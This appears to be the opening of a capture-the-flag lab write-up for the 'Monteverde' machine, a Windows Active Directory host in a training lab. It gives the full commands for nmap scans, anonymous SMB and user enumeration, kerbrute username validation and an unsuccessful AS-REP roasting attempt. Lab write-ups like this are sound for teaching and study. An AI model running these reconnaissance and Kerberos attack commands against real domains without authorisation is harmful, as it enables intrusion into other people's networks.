# Monteverde

# User Flag

## NMAP Enumeration

NMAP All Port Scan

```bash
sudo nmap -T5 --open -sS -vvv --min-rate=300 --max-retries=3 -p- -oN all-ports-nmap-report 10.10.10.172

PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
49666/tcp open  unknown          syn-ack ttl 127
49673/tcp open  unknown          syn-ack ttl 127
49674/tcp open  unknown          syn-ack ttl 127
49675/tcp open  unknown          syn-ack ttl 127
49736/tcp open  unknown          syn-ack ttl 127
49950/tcp open  unknown          syn-ack ttl 127
```

NMAP Service Scan:

```bash
nmap -sV -sC -Pn -v -oN nmap-report 10.10.10.172 -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49666,49673,49674,49675,49736,49950

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-06-29 14:25:35Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49675/tcp open  msrpc         Microsoft Windows RPC
49736/tcp open  msrpc         Microsoft Windows RPC
49950/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-06-29T14:26:29
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
```

## SMB Enumeration

Used `smbclient` which indicates anonymous logic is successful but no shares are returned.

```bash
smbclient -L //10.10.10.172 -N
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
```

Used `crackmapexec` but can't enumerate any shares:

```bash
crackmapexec smb 10.10.10.172 --shares
crackmapexec smb 10.10.10.172 -u '' -p '' --shares
crackmapexec smb 10.10.10.172 -u 'guest' -p '' --shares
```

Used `enum4linux` to enumerate shares and was able to retrieve some users.

```bash
cat enum4linux.txt
```

Used `crackmapexec` to get a list of users:

```bash
crackmapexec smb 10.10.10.172 -u '' -p '' --users

SMB         10.10.10.172    445    MONTEVERDE       [+] Enumerated domain user(s)
SMB         10.10.10.172    445    MONTEVERDE       MEGABANK.LOCAL\Guest                          Built-in account for guest access to the computer/domain                                                                                                                                    
SMB         10.10.10.172    445    MONTEVERDE       MEGABANK.LOCAL\AAD_987d7f2f57d2               Service account for the Synchronization Service with installation identifier 05c97990-7587-4a3d-b312-309adfc172d9 running on computer MONTEVERDE.                                           
SMB         10.10.10.172    445    MONTEVERDE       MEGABANK.LOCAL\mhope                          
SMB         10.10.10.172    445    MONTEVERDE       MEGABANK.LOCAL\SABatchJobs                    
SMB         10.10.10.172    445    MONTEVERDE       MEGABANK.LOCAL\svc-ata                        
SMB         10.10.10.172    445    MONTEVERDE       MEGABANK.LOCAL\svc-bexec                      
SMB         10.10.10.172    445    MONTEVERDE       MEGABANK.LOCAL\svc-netapp                     
SMB         10.10.10.172    445    MONTEVERDE       MEGABANK.LOCAL\dgalanos                       
SMB         10.10.10.172    445    MONTEVERDE       MEGABANK.LOCAL\roleary                        
SMB         10.10.10.172    445    MONTEVERDE       MEGABANK.LOCAL\smorgan
```

## Kerberos

Use kerbrute to validate user list:

```bash
sudo /opt/kerbrute_linux_amd64 userenum --dc 10.10.10.172 -d MEGABANK.LOCAL -o kerbrute-user-enum /home/kali/Downloads/HackTheBox/Monteverde/userslist

2024/06/29 15:44:26 >  [+] VALID USERNAME:       svc-ata@MEGABANK.LOCAL
2024/06/29 15:44:26 >  [+] VALID USERNAME:       mhope@MEGABANK.LOCAL
2024/06/29 15:44:26 >  [+] VALID USERNAME:       SABatchJobs@MEGABANK.LOCAL
2024/06/29 15:44:26 >  [+] VALID USERNAME:       svc-bexec@MEGABANK.LOCAL
2024/06/29 15:44:26 >  [+] VALID USERNAME:       AAD_987d7f2f57d2@MEGABANK.LOCAL
2024/06/29 15:44:26 >  [+] VALID USERNAME:       svc-netapp@MEGABANK.LOCAL
2024/06/29 15:44:26 >  [+] VALID USERNAME:       dgalanos@MEGABANK.LOCAL
2024/06/29 15:44:26 >  [+] VALID USERNAME:       roleary@MEGABANK.LOCAL
2024/06/29 15:44:26 >  [+] VALID USERNAME:       smorgan@MEGABANK.LOCAL
```

ASREPRoasting with Impacket:

```bash
sudo python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py MEGABANK.LOCAL/ -dc-ip 10.10.10.172 -usersfile userslist -no-pass -request -outputfile kerberos-users-found
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User AAD_987d7f2f57d2 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User mhope doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User SABatchJobs doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User svc-ata doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User svc-bexec doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User svc-netapp doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User dgalanos doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User roleary doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User smorgan doesn't have UF_DONT_REQUIRE_PREAUTH set
```


















